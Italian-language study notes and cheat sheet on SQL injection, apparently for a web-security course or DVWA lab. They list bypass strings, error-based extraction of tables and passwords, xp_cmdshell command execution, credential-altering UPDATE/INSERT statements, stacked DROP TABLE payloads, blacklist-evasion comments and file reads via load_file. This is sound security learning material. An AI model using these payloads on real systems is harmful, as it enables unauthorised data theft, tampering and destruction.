## SQL injection

- http://www.securiteam.com/securityreviews/5DP0N1P76E.html
- https://en.wikipedia.org/wiki/SQL_injection
- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
- http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
- https://www.owasp.org/index.php/SQL_Injection
- http://bobby-tables.com/

TODO prova sqlmap

Il seguente codice è vulnerabile a SQLI.

```
statement = "SELECT * FROM users WHERE name = '" + userName + "';"
```

Un primo test per verificare la vulnerabilità è usare `x' or 1=1--`.
`--` è un commento.
Se il commento non aiuta, posso usare `' or 'a'='a`.
Altre varianti sono`' or 1=1–`, `' or 1=1–`, `or 1=1–`, `' or 'a'='a`, `' or 'a'='a`, `') or ('a'='a`.

Su sistemi Windows è possibile lanciare comandi usando `master..xp_cmdshell`.
Un esempio è `'; exec master..xp_cmdshell 'ping 10.10.1.2'--`.
Se l'apice singolo (`'`) non ha effetto prova a usare il doppio apice (`''`).
Posso scrivere l'output di una query in una pagina html usando `master..sp_makewebtask`.
Un esempio è `'; exec master..makewebtask '\10.10.1.3shareoutput.html', 'select * from information_schema.tables'`.

Posso usare i messaggi di errore per ottenere informazioni sul database.
Genero un errore se provo a fare l'union di un intero con una stringa.
Come stringa scelgo il nome di una tabella, estraibile con `select top 1 table_name from information_schema.tables`.
Eseguo l'injection con `10 union select top 1 table_name from information_schema.tables--`.
Un possibile messaggio di errore è il seguente:

```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'table1' to a column of data type int.
/index.asp, line 5
```

In questo modo ottengo il nome della prima tabella del database (`table1`).
Posso ottenere il nome della tabella successiva eseguendo l'injection con `10 union select top 1 table_name from information_schema.tables not in ('table1')--`.
Oppure fare una ricerca basata sul nome eseguendo l'injection con `10 union select top 1 table_name from information_schema.tables LIKE '%login%25'--`.

Conoscendo il nome di una tabella posso anche estrarre i nomi delle colonne.
Eseguo l'injection `10 union select top 1 column_name from information_schema.columns where table_name='admin_login'--`.
Una volta ottenuti i nomi di tabelle e relative colonne posso interrogare il database per estrarre informazioni utili.

I casi precedenti presuppongono che l'output della query sia una stringa non numerica.
Per estrarre risultati numerici posso eseguire l'injection con `10 union select top 1 convert(int, password%2b%20morpheus') from admin_login where login_name='trinity'--`.
`%2b` è la codifica ascii di `+`.
Concateno il valore della colonna password alla stringa ` morphes`, che all'esecuzione `convert` causerà un errore.
Un possibile messaggio di errore è il seguente:

```
Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value ‘31173 morpheus’ to a column of data type int.
/index.asp, line 5
```

Posso alterare il contenuto del database eseguendo l'injection `10; update 'admin_login' set 'password' = 'password2' where login_name='admin'--` oppure `10; insert into 'admin_login' ('login_id','login_name',,'password') values (666, 'admin2', 'password2')--`.

---

Commentare il resto della query: `--`, `#`  
Injection: `admin' --`  
Query risultante: `select * from members where username = 'admin' --' and password = 'password'`

Commentare parte della query: `/* c */`  
Injection: `drop /* c */ tablename`, `dr/* bypass blacklisting */op/* c */ tablename`, `select/*avoid spaces*/password/**/from/**/members`

Commentare parte della query: `/*! c */`  
Injection: `select /*! 32302 1/0, */ 1 from tablename` (in mysql se la versone è superiore a 3.23.02 viene lanciata un'eccezione divison by 0)

In mysql superiore a 3.23.02 `10` e `/*! 32302 10 */` sono equivalenti

Eseguire stacked query in una transazione: `;`  
Injection: `; drop tablename1; drop tablename2 --`  
Non tutti i linguaggi/database supportano stacked query in una transazione

Uso di interi: `0x<hexnumber>`, `0x<hexnumber> + 0x<hexnumber>`

Concatenazione stringhe: `+`, `||`  
Injection: `concat(char(75), char(76), char(77))`, `concat(char(75) + char(76) + char(77))`, `concat(chr(75)||chr(76)||chr(77))`, `concat(CHaR(75)||CHaR(76)||CHaR(77))` (in base al database generano tutte 'KLM')  
Injection: `load_file(0x633A5C626F6F742E696E69)` (carica il contenuto di `c:\boot.ini`)  
In mysql in ansi mode meglio usare `concat()`

<!-- continue https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections -->

## SQL injection - Low

```
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

Exploit:

- inietta `' or 'a' = 'a`

## SQL injection - Medium

```
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
```

mysqli::real_escape_string -- mysqli::escape_string -- mysqli_real_escape_string — Escapes special characters in a string for use in an SQL statement, taking into account the current charset of the connection  
Characters encoded are NUL (ASCII 0), \\n, \\r, \\, ', ", and Control-Z. 

Exploit:

- inietta `1 or 1=1`

## SQL injection - High

```
// Get input
$id = $_SESSION[ 'id' ];

// Check database
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

Exploit: non sfruttabile

